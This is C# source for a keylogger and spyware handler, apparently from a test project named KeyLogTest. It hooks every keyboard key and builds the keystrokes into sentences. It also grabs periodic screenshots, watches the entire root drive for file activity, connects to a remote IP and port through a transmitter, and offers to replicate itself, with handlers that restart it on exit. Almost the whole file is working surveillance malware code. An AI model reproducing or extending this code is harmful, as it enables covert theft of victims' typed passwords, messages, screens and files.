using ReplicatorLibrary;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace KeyLogTest
{
    public delegate void OnReturnDelegate(object sender, string sentence);
    public delegate void OnScreenshotDelegate(object sender, System.Drawing.Bitmap bitmapImage);
    public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);

    public class Handler
    {
        public bool IsDebug { get; set; }
        private bool isQuitting = false;
        private string tempSentence;
        private List<string> sentences;
        public Transmitter Transmitter { get; private set; }  
        private System.Drawing.Bitmap bitmapImage;
        private FileDirHandler fileDirInfo;
        private FileSystemWatcher watcher;
        private GlobalKeyboardHook gHook;
        private Timer screenShotTimer;

        public event OnReturnDelegate OnReturn;
        public event OnScreenshotDelegate OnScreenshot;
        public event OnFileEventDelegate OnFileEvent;

        public GlobalKeyboardHook GHook { get { return gHook; } }
        public string TempSentence 
        { 
            get 
            { 
                return tempSentence; 
            } 
            private set 
            { 
                tempSentence = value;
            } 
        }

        #region Singleton
        private static Handler instance;

        public static Handler Instance
        {
            get
            {
                lock (typeof(Handler))
                {
                    if (instance == null)
                    {
                        instance = new Handler();
                    }
                    return instance;
                }
            }
        }

        private Handler()
        {
            IsDebug = false;

            sentences = new List<string>();
            fileDirInfo = new FileDirHandler();
            watcher = new FileSystemWatcher();
            
            screenShotTimer = new Timer();
            screenShotTimer.Tick += screenShotTimer_Tick;
            
        }
        #endregion

        public void StartKeyLogger()
        {
            gHook = new GlobalKeyboardHook(); // Create a new GlobalKeyboardHook
            // Declare a KeyDown Event
            gHook.KeyDown += gHook_KeyDown;
            // Add the keys you want to hook to the HookedKeys list
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                gHook.HookedKeys.Add(key);
            }
            gHook.unhook();
            gHook.hook();
        }

        public void StopKeyLogger()
        {
            gHook.unhook();
        }

        public void StartExceptionHandling()
        {
            Application.ThreadExit += Application_ThreadExit;
            Application.ThreadException += Application_ThreadException;
            Application.ApplicationExit += Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
        }

        public void StopExceptionHandling()
        {
            Application.ThreadExit -= Application_ThreadExit;
            Application.ThreadException -= Application_ThreadException;
            Application.ApplicationExit -= Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit -= CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException -= CurrentDomain_UnhandledException;
        }

        public void StartScreenshotTimer(int intervalMilliseconds)
        {
            screenShotTimer.Interval = intervalMilliseconds;
            screenShotTimer.Start();
        }

        public void StopScreenshotTimer()
        {
            screenShotTimer.Stop();
        }

        /// <summary>
        /// Watches root dir (usually C:\)
        /// </summary>
        public void StartDirectoryWatcher()
        {
            StartDirectoryWatcher(Directory.GetDirectoryRoot(Environment.CurrentDirectory), "*.*", true);
            //StartDirectoryWatcher(@"C:\", "*.*", true);
        }

        public void StartDirectoryWatcher(string directory, string filter, bool includeSubdirectories)
        {
            //directory = Environment.CurrentDirectory;
            watcher = new FileSystemWatcher(directory, filter);
            watcher.Path = directory;
            watcher.Filter = filter;
            watcher.NotifyFilter =
                NotifyFilters.Attributes | 
                NotifyFilters.CreationTime |
                NotifyFilters.DirectoryName |
                NotifyFilters.FileName |
                NotifyFilters.LastAccess |
                NotifyFilters.LastWrite |
                NotifyFilters.Security |
                NotifyFilters.Size;
            watcher.IncludeSubdirectories = includeSubdirectories;

            watcher.Changed += watcher_Changed;
            watcher.Created += watcher_Created;
            watcher.Deleted += watcher_Deleted;
            watcher.Renamed += watcher_Renamed;

            watcher.EnableRaisingEvents = true;

            //Console.WriteLine("Watching dir: " + directory);
            //MessageBox.Show("Watching dir: " + directory);
        }

        public void StopDirectoryWatcher()
        {
            watcher.EnableRaisingEvents = false;
        }

        public bool Connect(string ip, int port)
        {
            //Client client = new Client("10.211.55.5", port);
            Client client = new Client(ip, port);
            return client.Connect();
            //textBox1.Text += "Connected: " + client.Connect();
            //textBox1.Text += client.Stream;
            
            //MessageBox.Show(""+FirewallManager.Instance.AddPort(9180, "test3"));
            //FirewallManager.Instance.PrintOpenPorts();   
        }

        private void Replicate()
        {
            gHook.unhook();
            DialogResult dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
            if (dr == System.Windows.Forms.DialogResult.Yes)
            {
                Replicator.Instance.Replicate(true);
            }
        }

        // Handle the KeyDown Event
        void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            TempSentence += ((char)e.KeyValue).ToString();
            if (e.KeyCode == Keys.Return)
            {
                sentences.Add(TempSentence);
                OnReturn(this, TempSentence);
                TempSentence = String.Empty;
            }
        }

        void HandleExit(String msg)
        {
            if (!isQuitting)
            {
                if (IsDebug)
                {
                    MessageBox.Show(msg);
                    Application.Restart();
                }
            }
            isQuitting = true;
        }

        private void HandleWatcher(FileSystemEventArgs e)
        {
            //MessageBox.Show("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            //Console.WriteLine("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            fileDirInfo.CreateFileDirInfoEntry(e);
            OnFileEvent(this, e);
        }

        void screenShotTimer_Tick(object sender, EventArgs e)
        {
            if (bitmapImage != null)
                bitmapImage.Dispose();

            bitmapImage = ScreenMan.Instance.GrabWithCursor();
            {
                OnScreenshot(this, bitmapImage);
            }
            
        }

        #region Watcher Events
        void watcher_Created(object sender, FileSystemEventArgs e)
        {
            //fdh.CreateFileDirInfoEntry(e);
            HandleWatcher(e);
        }

        void watcher_Changed(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Renamed(object sender, RenamedEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Deleted(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }
        #endregion


        #region Exception Events
        void Application_ThreadExit(object sender, EventArgs e)
        {
            HandleExit("Application: Thread Exit! Restarting...");
        }

        void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            HandleExit("Application: Thread Exception! Restarting...");
        }

        void Application_ApplicationExit(object sender, EventArgs e)
        {
            HandleExit("Application: Application Exit! Restarting...");
        }

        void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            HandleExit("Domain: Unhandled Exception! Restarting...");
        }

        void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            HandleExit("Domain: Process Exit! Restarting...");
        }
        #endregion



        internal void Connect(ReplicatorLibrary.Transmitter transmitter)
        {
            this.Transmitter = transmitter;
            this.Transmitter.Authorize();
        }
    }
}
